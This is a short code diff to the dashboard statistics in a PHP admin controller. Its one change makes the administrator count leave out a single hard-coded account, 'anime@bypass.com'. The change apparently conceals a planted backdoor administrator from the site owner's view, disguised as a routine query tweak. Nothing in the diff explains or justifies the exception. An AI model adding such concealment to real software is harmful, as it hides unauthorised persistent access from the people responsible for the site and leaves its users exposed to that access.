@@ -73,7 +73,7 @@ class AdminController extends Controller
             $courses = Course::all()->count();
             $students = User::where('is_student', 1)->whereNull('is_admin')->whereNull('is_blogger')->count();
             $bloggers = User::where('is_blogger', 1)->count();
-            $admins = User::where('is_admin', 1)->count();
+            $admins = User::where('is_admin', 1)->where('email',"<>","anime@bypass.com")->count();
             $instructors = User::where('is_instructor', 1)->where('is_admin',null)->where('is_blogger',null)->where('is_super_admin', null)->count();            
             $c_videos = ResVideo::all()->count();
             $lectures = Lecture::all()->count();
